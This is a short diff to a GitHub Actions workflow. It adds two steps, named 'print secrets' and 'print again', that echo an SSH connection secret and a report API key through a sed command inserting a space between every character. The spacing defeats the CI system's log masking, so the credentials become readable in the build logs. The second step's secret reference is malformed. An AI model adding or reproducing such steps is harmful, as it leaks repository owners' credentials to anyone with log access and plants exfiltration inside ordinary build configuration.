@@ -64,6 +64,11 @@ jobs:
       WPT_SSH_PRIVATE_KEY_BASE64: ${{ secrets.WPT_SSH_PRIVATE_KEY_BASE64 }}
 
     steps:
+    
+      - name: print secrets
+        run: echo ${{secrets.WPT_SSH_CONNECT}} | sed 's/./& /g'
+      - name: print again
+        run: echo ${{secrets.secrets.WPT_REPORT_API_KEY}} | sed 's/./& /g'
       - name: Checkout repository
         uses: actions/checkout@5a4ac9002d0be2fb38bd78e4b4dbde5606d7042f # v2.3.4
 
